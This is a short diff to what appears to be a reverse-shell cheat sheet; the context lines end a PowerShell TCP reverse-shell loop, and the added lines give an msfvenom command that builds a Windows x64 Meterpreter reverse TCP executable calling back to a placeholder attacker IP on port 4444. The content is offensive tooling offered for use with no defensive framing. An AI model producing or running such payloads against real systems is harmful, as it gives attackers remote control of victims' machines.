@@ -13,3 +13,12 @@ while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
 };
 $client.Close()
 ```
+
+# MSFVENOM
+```powershell
+msfvenom -p windows/x64/meterpreter_reverse_tcp \
+  LHOST=<SƏNİN_IP_ÜNVANIN> \
+  LPORT=4444 \
+  -f exe \
+  -o reverse_x64.exe
+```
